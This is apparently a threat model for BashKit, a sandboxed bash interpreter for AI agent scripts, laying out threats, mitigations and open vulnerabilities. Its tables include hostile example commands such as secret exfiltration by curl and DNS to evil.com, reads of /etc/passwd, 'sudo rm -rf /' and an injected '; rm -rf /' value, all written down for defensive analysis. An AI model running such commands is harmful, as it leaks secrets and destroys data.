# BashKit Threat Model

## Overview

BashKit is a sandboxed bash interpreter for multi-tenant environments, primarily designed for AI agent script execution. This document analyzes security threats and mitigations.

**Threat Actors**: Malicious or buggy scripts from untrusted sources (AI agents, users)
**Assets**: Host CPU, memory, filesystem, network, secrets, other tenants

---

## Trust Model

```
┌─────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Script Input (bash code)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
│                           ▼                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │     TRUST BOUNDARY: Bash::exec(&str)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
└───────────────────────────┼──────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                      SANDBOXED                               │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │  Parser  │→ │Interpreter│→ │Virtual FS│  │ Network  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  Controls: Resource Limits, FS Isolation, Network Allowlist │
└─────────────────────────────────────────────────────────────┘
```

---

## Threat Analysis by Category

### 1. Resource Exhaustion (DoS)

#### 1.1 Memory Exhaustion

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Large script input | `Bash::exec(huge_string)` | None | **VULNERABLE** |
| Output flooding | `yes \| head -n 1000000000` | None | **VULNERABLE** |
| Variable explosion | `x=$(cat /dev/urandom)` | No /dev/urandom | Mitigated |
| Array growth | `arr+=(element)` in loop | Command limit | Mitigated |

**Current Risk**: HIGH - No input size limit, no output buffer limit

**Recommendations**:
```rust
// Add to ExecutionLimits
max_input_bytes: 10_000_000,    // 10MB script limit
max_output_bytes: 10_000_000,   // 10MB stdout+stderr
max_variable_size: 1_000_000,   // 1MB per variable
```

#### 1.2 Infinite Loops

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| While true | `while true; do :; done` | Loop limit (10K) | **MITIGATED** |
| For loop | `for i in $(seq 1 inf); do` | Loop limit | **MITIGATED** |
| Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop counter | Partial |
| Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |

**Current Risk**: LOW - Loop and command limits prevent infinite execution

**Gap**: Nested loops each get fresh 10K counter. Deep nesting could execute 10K^depth commands.

#### 1.3 Stack Overflow (Recursion)

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Function recursion | `f() { f; }; f` | Depth limit (100) | **MITIGATED** |
| Command sub nesting | `$($($($())))` | Depth limit | **MITIGATED** |
| Parser recursion | Deeply nested `(((())))` | None | **VULNERABLE** |

**Current Risk**: MEDIUM - Execution protected, parser vulnerable

#### 1.4 CPU Exhaustion

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
| Parser hang | `for i in 1; do echo; done; echo done` | None | **VULNERABLE** |
| Regex backtrack | `grep "a](*b)*c" file` | Regex crate limits | Partial |

**Current Risk**: MEDIUM - Known parser hang on reserved words

---

### 2. Sandbox Escape

#### 2.1 Filesystem Escape

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Path traversal | `cat ../../../etc/passwd` | Path normalization | **MITIGATED** |
| Symlink escape | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | **MITIGATED** |
| Real FS access | Direct syscalls | No real FS by default | **MITIGATED** |
| Mount escape | Mount real paths | MountableFs controlled | **MITIGATED** |

**Current Risk**: LOW - Virtual filesystem provides strong isolation

**Code Reference**: `fs/memory.rs:81-105` (normalize_path)

#### 2.2 Process Escape

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Shell escape | `exec /bin/bash` | exec not implemented (returns exit 127) | **MITIGATED** |
| Subprocess | `./malicious` | External exec disabled (returns exit 127) | **MITIGATED** |
| Background proc | `malicious &` | Background not impl | **MITIGATED** |
| eval injection | `eval "$user_input"` | eval runs in sandbox (can only execute builtins) | **MITIGATED** |

**Current Risk**: LOW - No external process execution capability

**Note**: Unimplemented commands return bash-compatible error:
- Exit code: 127
- Stderr: `bash: <cmd>: command not found`
- Script continues execution (unless `set -e`)

#### 2.3 Privilege Escalation

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| sudo/su | `sudo rm -rf /` | Not implemented | **MITIGATED** |
| setuid | Permission changes | Virtual FS, no real perms | **MITIGATED** |
| Capability abuse | Linux capabilities | Runs in-process | **MITIGATED** |

**Current Risk**: NONE - No privilege operations available

---

### 3. Information Disclosure

#### 3.1 Secrets Access

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Env var leak | `echo $SECRET_KEY` | Env vars caller-controlled | **CALLER RISK** |
| File secrets | `cat /secrets/key` | Virtual FS isolation | **MITIGATED** |
| Proc secrets | `/proc/self/environ` | No /proc filesystem | **MITIGATED** |
| Memory dump | Core dumps | No crash dumps | **MITIGATED** |

**Current Risk**: MEDIUM - Caller must sanitize environment variables

**Recommendation**: Document that callers should NOT pass sensitive env vars:
```rust
// UNSAFE - leaks secrets
Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .build();

// SAFE - only pass needed vars
Bash::builder()
    .env("HOME", "/home/user")
    .build();
```

#### 3.2 Host Information

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Hostname | `hostname`, `$HOSTNAME` | Returns configurable sandbox value (default: "bashkit-sandbox") | **MITIGATED** |
| Username | `whoami`, `$USER` | Returns configurable sandbox value (default: "sandbox") | **MITIGATED** |
| IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
| System info | `uname -a` | Returns configurable sandbox values | **MITIGATED** |
| User ID | `id` | Returns hardcoded uid=1000 with configurable username | **MITIGATED** |

**Current Risk**: NONE - System builtins return configurable sandbox values (never real host info)

**Implementation**: `builtins/system.rs` provides configurable system builtins:
- `hostname` → configurable (default: "bashkit-sandbox")
- `uname` → hardcoded Linux 5.15.0 / configurable hostname
- `whoami` → configurable (default: "sandbox")
- `id` → uid=1000(configurable) gid=1000(configurable)

**Configuration**:
```rust
Bash::builder()
    .username("deploy")      // Sets whoami, id, and $USER env var
    .hostname("my-server")   // Sets hostname, uname -n
    .build();
```

#### 3.3 Network Exfiltration

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| HTTP exfil | `curl https://evil.com?data=$SECRET` | Network allowlist | **MITIGATED** |
| DNS exfil | `nslookup $SECRET.evil.com` | No DNS commands | **MITIGATED** |
| Timing channel | Response time variations | Not addressed | Minimal risk |

**Current Risk**: LOW - Network allowlist blocks unauthorized destinations

---

### 4. Injection Attacks

#### 4.1 Command Injection

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Variable injection | `$user_input` containing `; rm -rf /` | Variables not re-parsed | **MITIGATED** |
| Backtick injection | `` `$malicious` `` | Parsed as command sub | **MITIGATED** |
| eval bypass | `eval $user_input` | eval sandboxed (only runs builtins) | **MITIGATED** |

**Current Risk**: LOW - Bash's quoting rules apply, variables expand to strings only

**Example**:
```bash
# User provides: "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, not executed)
```

#### 4.2 Path Injection

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Null byte | `cat "file\x00/../etc/passwd"` | Rust strings no nulls | **MITIGATED** |
| Path traversal | `../../../../etc/passwd` | Path normalization | **MITIGATED** |
| Encoding bypass | URL/unicode encoding | PathBuf handles | **MITIGATED** |

**Current Risk**: NONE - Rust's type system prevents these attacks

#### 4.3 XSS-like Issues

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| HTML in output | Script outputs `<script>` | N/A - CLI tool | **NOT APPLICABLE** |
| Terminal escape | ANSI escape sequences | Caller should sanitize | **CALLER RISK** |

**Current Risk**: LOW - BashKit is not a web application

**Note**: If output is displayed in a terminal or web UI, callers should sanitize:
```rust
let result = bash.exec(script).await?;
let safe_output = sanitize_terminal_escapes(&result.stdout);
```

---

### 5. Network Security

#### 5.1 DNS Manipulation

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
| DNS rebinding | Rebind after allowlist check | Literal host matching | **MITIGATED** |
| DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |

**Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS

**Code Reference**: `network/allowlist.rs:78-111`
```rust
// Allowlist matches literal strings, not resolved IPs
allowlist.allow("https://api.example.com");
// "api.example.com" must match exactly - no DNS lookup
```

#### 5.2 Network Bypass

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| IP instead of host | `curl http://93.184.216.34` | Literal IP blocked unless allowed | **MITIGATED** |
| Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
| Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
| Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |

**Current Risk**: LOW - Strict allowlist enforcement

---

### 6. Multi-Tenant Isolation

#### 6.1 Cross-Tenant Access

| Threat | Attack Vector | Mitigation | Status |
|--------|--------------|------------|--------|
| Shared filesystem | Access other tenant files | Separate Bash instances | **MITIGATED** |
| Shared memory | Read other tenant data | Rust memory safety | **MITIGATED** |
| Resource starvation | One tenant exhausts limits | Per-instance limits | **MITIGATED** |

**Current Risk**: LOW - Each Bash instance is fully isolated

**Usage Pattern**:
```rust
// Each tenant gets isolated instance
let tenant_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))
    .limits(tenant_limits)
    .build();

let tenant_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate FS
    .limits(tenant_limits)
    .build();
```

---

## Vulnerability Summary

### Critical (Immediate Action Required)

| ID | Vulnerability | Impact | Mitigation |
|----|--------------|--------|------------|
| V1 | No input size limit | Memory exhaustion | Add `max_input_bytes` limit |
| V2 | No output buffer limit | Memory exhaustion | Add `max_output_bytes` limit |
| V3 | Parser hang on reserved words | CPU DoS | Add parser timeout |

### High (Should Fix)

| ID | Vulnerability | Impact | Mitigation |
|----|--------------|--------|------------|
| V4 | No parser recursion limit | Stack overflow | Limit AST depth |
| V5 | Nested loops multiply limits | Excessive execution | Aggregate loop counter |

### Medium (Track)

| ID | Vulnerability | Impact | Mitigation |
|----|--------------|--------|------------|
| V6 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
| V7 | Terminal escapes in output | UI manipulation | Document sanitization need |

### Low (Acceptable)

| ID | Vulnerability | Impact | Mitigation |
|----|--------------|--------|------------|
| V8 | Symlinks not followed | Functionality gap | Implement with loop detection |
| V9 | Globs incomplete | Functionality gap | Complete implementation |

---

## Security Controls Matrix

| Control | Threat Mitigated | Implementation | Tested |
|---------|-----------------|----------------|--------|
| Command limit (10K) | Infinite execution | `limits.rs` | Yes |
| Loop limit (10K) | Infinite loops | `limits.rs` | Yes |
| Function depth (100) | Stack overflow | `limits.rs` | Yes |
| Timeout (30s) | CPU exhaustion | `limits.rs` | Partial |
| Virtual filesystem | FS escape | `fs/memory.rs` | Yes |
| Path normalization | Path traversal | `fs/memory.rs` | Yes |
| Network allowlist | Data exfiltration | `network/allowlist.rs` | Yes |
| Sandboxed eval, no exec | Code injection | eval runs builtins only, exec not implemented | Yes |
| Fail-point testing | Control bypass | `security_failpoint_tests.rs` | Yes |
| Builtin panic catching | Custom builtin crashes | `interpreter/mod.rs` | Yes |
| Error message sanitization | Information disclosure | `builtin_error_security_tests.rs` | Yes |

---

## Recommended Limits for Production

```rust
ExecutionLimits::new()
    .max_commands(10_000)         // Prevent runaway scripts
    .max_loop_iterations(10_000)  // Prevent infinite loops
    .max_function_depth(100)      // Prevent stack overflow
    .timeout(Duration::from_secs(30))  // Prevent CPU exhaustion
    // TODO: Add these
    .max_input_bytes(10_000_000)  // 10MB script limit
    .max_output_bytes(10_000_000) // 10MB output limit
    .max_variable_size(1_000_000) // 1MB per variable
```

---

## Caller Responsibilities

1. **Sanitize environment variables** - Don't pass secrets
2. **Use allowlist for network** - Default denies all
3. **Sanitize output** - If displaying in terminal/web
4. **Set appropriate limits** - Based on use case
5. **Isolate tenants** - Separate Bash instances per tenant

---

## Testing Coverage

| Threat Category | Unit Tests | Fail-Point Tests | Threat Model Tests | Fuzz Tests | Proptest |
|----------------|------------|------------------|-------------------|------------|----------|
| Resource limits | ✅ | ✅ | ✅ | ✅ | ✅ |
| Filesystem escape | ✅ | ✅ | ✅ | - | ✅ |
| Injection attacks | ✅ | ❌ | ✅ | ✅ | ✅ |
| Information disclosure | ✅ | ✅ | ✅ | - | - |
| Network bypass | ✅ | ❌ | ✅ | - | - |
| Multi-tenant isolation | ✅ | ❌ | ✅ | - | - |
| Parser edge cases | ✅ | ❌ | ✅ | ✅ | ✅ |
| Custom builtin errors | ✅ | ✅ | ✅ | - | - |

**Test Files**:
- `tests/threat_model_tests.rs` - 51 threat-based security tests
- `tests/security_failpoint_tests.rs` - Fail-point injection tests
- `tests/builtin_error_security_tests.rs` - Custom builtin error handling tests (34 tests)

**Recommendation**: Add cargo-fuzz for parser and input handling.

---

## Security Tooling

This section documents the security tools used to detect and prevent vulnerabilities in BashKit.

### Static Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-audit** | CVE scanning for dependencies | ✅ Required | Every PR |
| **cargo-deny** | License + advisory checks | ✅ Required | Every PR |
| **cargo-clippy** | Lint with security-focused warnings | ✅ Required | Every PR |
| **cargo-geiger** | Count unsafe code blocks | ✅ Informational | Every PR |

**cargo-audit**: Scans `Cargo.lock` against RustSec Advisory Database for known vulnerabilities.
```bash
cargo audit
```

**cargo-geiger**: Tracks unsafe code usage to ensure it remains minimal and audited.
```bash
cargo geiger --all-features
```

### Dynamic Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-fuzz** | LibFuzzer-based fuzzing | ✅ Scheduled | Nightly/Weekly |
| **Miri** | Undefined behavior detection | ✅ Required | Every PR |
| **proptest** | Property-based testing | ✅ Required | Every PR |

**cargo-fuzz**: Finds crashes, hangs, and memory issues in parser and interpreter.
```bash
cargo +nightly fuzz run parser_fuzz -- -max_total_time=300
```

**Miri**: Detects undefined behavior in unsafe code blocks.
```bash
cargo +nightly miri test --lib
```

**proptest**: Generates random inputs to test invariants and boundary conditions.
```rust
proptest! {
    #[test]
    fn parser_handles_arbitrary_input(s in ".*") {
        // Should not panic on any input
        let _ = parse(&s);
    }
}
```

### Memory Safety Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| **AddressSanitizer (ASAN)** | Memory errors, buffer overflow | Local testing, CI (optional) |
| **Miri** | UB detection in unsafe code | CI required |
| **cargo-careful** | Extra UB checks | Local development |

### Supply Chain Security

| Tool | Purpose | CI Integration |
|------|---------|----------------|
| **cargo-audit** | Known CVE detection | ✅ Required |
| **cargo-deny** | License compliance | ✅ Required |
| **Dependabot** | Automated dependency updates | GitHub-native |

### Fuzzing Targets

The following components are fuzz-tested for robustness:

| Target | File | Threats Mitigated |
|--------|------|-------------------|
| Parser | `fuzz/fuzz_targets/parser_fuzz.rs` | V3 (parser hang), V4 (parser recursion) |
| Lexer | `fuzz/fuzz_targets/lexer_fuzz.rs` | Tokenization crashes |
| Arithmetic | `fuzz/fuzz_targets/arithmetic_fuzz.rs` | Integer overflow, parsing errors |
| Pattern matching | `fuzz/fuzz_targets/glob_fuzz.rs` | Glob/regex DoS |

### Vulnerability Detection Matrix

| Vulnerability | cargo-audit | cargo-fuzz | Miri | proptest | ASAN |
|--------------|-------------|------------|------|----------|------|
| Known CVEs | ✅ | - | - | - | - |
| Parser crashes | - | ✅ | - | ✅ | ✅ |
| Stack overflow | - | ✅ | ✅ | - | ✅ |
| Buffer overflow | - | ✅ | ✅ | - | ✅ |
| Undefined behavior | - | - | ✅ | - | - |
| Integer overflow | - | ✅ | ✅ | ✅ | - |
| Infinite loops | - | ✅ | - | ✅ | - |
| Memory leaks | - | ✅ | - | - | ✅ |

---

## References

- `specs/001-architecture.md` - System design
- `specs/003-vfs.md` - Virtual filesystem design
- `specs/005-security-testing.md` - Fail-point testing
- `src/builtins/system.rs` - Hardcoded system builtins
- `tests/threat_model_tests.rs` - Threat model test suite (51 tests)
- `tests/security_failpoint_tests.rs` - Fail-point security tests
